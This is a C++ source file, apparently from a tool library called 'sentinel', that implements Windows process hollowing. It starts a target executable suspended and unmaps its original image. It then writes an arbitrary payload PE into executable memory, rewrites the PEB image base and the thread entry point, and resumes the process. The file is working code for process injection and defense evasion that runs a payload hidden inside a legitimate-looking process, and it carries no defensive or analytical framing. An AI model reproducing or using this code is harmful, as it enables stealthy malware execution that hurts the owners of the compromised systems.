#include "sentinel/process/hollowing.h"
#include "sentinel/core/error.h"
#include "sentinel/utils/logger.h"
#include <cstring>

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <winternl.h>

typedef NTSTATUS(NTAPI* NtUnmapViewOfSection_t)(HANDLE, PVOID);

int sentinel_hollow_process(const sentinel_hollow_config_t* config,
                             sentinel_hollow_result_t* result) {
    if (!config || !result || !config->target_path || !config->payload_data)
        return SENTINEL_ERROR_INVALID_PARAMETER;
    memset(result, 0, sizeof(*result));

    STARTUPINFOA si = {}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {};
    if (!CreateProcessA(config->target_path, nullptr, nullptr, nullptr, FALSE,
                        CREATE_SUSPENDED | config->creation_flags,
                        nullptr, nullptr, &si, &pi))
        return SENTINEL_ERROR_PROCESS_NOT_FOUND;

    result->pid = pi.dwProcessId;
    result->tid = pi.dwThreadId;
    result->process_handle = pi.hProcess;
    result->thread_handle = pi.hThread;

    /* Get context to find image base from PEB */
    CONTEXT ctx = {}; ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    /* Read PEB to get ImageBaseAddress */
#ifdef _WIN64
    sentinel_addr_t peb_addr = ctx.Rdx; /* RDX = PEB in 64-bit */
    sentinel_addr_t img_base_offset = 0x10;
#else
    sentinel_addr_t peb_addr = ctx.Ebx; /* EBX = PEB in 32-bit */
    sentinel_addr_t img_base_offset = 0x08;
#endif

    sentinel_addr_t orig_base = 0;
    SIZE_T rd;
    ReadProcessMemory(pi.hProcess, (LPCVOID)(peb_addr + img_base_offset),
                      &orig_base, sizeof(orig_base), &rd);

    /* Unmap the original image */
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    auto pNtUnmap = (NtUnmapViewOfSection_t)GetProcAddress(ntdll, "NtUnmapViewOfSection");
    if (pNtUnmap) pNtUnmap(pi.hProcess, (PVOID)orig_base);

    /* Parse payload PE */
    const u8* pe = config->payload_data;
    i32 pe_off = *(const i32*)(pe + 0x3C);
    const u8* nt_hdr = pe + pe_off + 4;
    u16 num_sec = *(const u16*)(nt_hdr + 2);
    u16 opt_sz = *(const u16*)(nt_hdr + 16);
    const u8* opt = nt_hdr + 20;
    u32 img_size = *(const u32*)(opt + 56);
    u32 entry_rva = *(const u32*)(opt + 16);

    /* Allocate new image at the original base */
    LPVOID new_base = VirtualAllocEx(pi.hProcess, (LPVOID)orig_base, img_size,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!new_base) {
        new_base = VirtualAllocEx(pi.hProcess, nullptr, img_size,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    if (!new_base) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return SENTINEL_ERROR_OUT_OF_MEMORY;
    }

    /* Write headers */
    SIZE_T written;
    u32 hdr_size = *(const u32*)(opt + 60);
    WriteProcessMemory(pi.hProcess, new_base, pe,
                       hdr_size < config->payload_size ? hdr_size : config->payload_size, &written);

    /* Write sections */
    const u8* sec = nt_hdr + 20 + opt_sz;
    for (u16 i = 0; i < num_sec; i++) {
        const u8* s = sec + i * 40;
        u32 va = *(const u32*)(s + 12);
        u32 raw_sz = *(const u32*)(s + 16);
        u32 raw_off = *(const u32*)(s + 20);
        if (raw_off + raw_sz <= config->payload_size)
            WriteProcessMemory(pi.hProcess, (u8*)new_base + va, pe + raw_off, raw_sz, &written);
    }

    /* Update PEB image base */
    WriteProcessMemory(pi.hProcess, (LPVOID)(peb_addr + img_base_offset),
                       &new_base, sizeof(new_base), &written);

    /* Set entry point */
#ifdef _WIN64
    ctx.Rcx = (DWORD64)new_base + entry_rva;
#else
    ctx.Eax = (DWORD)new_base + entry_rva;
#endif
    SetThreadContext(pi.hThread, &ctx);

    result->image_base = (sentinel_addr_t)new_base;
    result->entry_point = (sentinel_addr_t)new_base + entry_rva;
    return SENTINEL_OK;
}

int sentinel_hollow_resume(sentinel_hollow_result_t* result) {
    if (!result || !result->thread_handle) return SENTINEL_ERROR_INVALID_PARAMETER;
    ResumeThread((HANDLE)result->thread_handle);
    return SENTINEL_OK;
}

#else
int sentinel_hollow_process(const sentinel_hollow_config_t* c, sentinel_hollow_result_t* r) { (void)c;(void)r; return SENTINEL_ERROR_UNSUPPORTED; }
int sentinel_hollow_resume(sentinel_hollow_result_t* r) { (void)r; return SENTINEL_ERROR_UNSUPPORTED; }
#endif
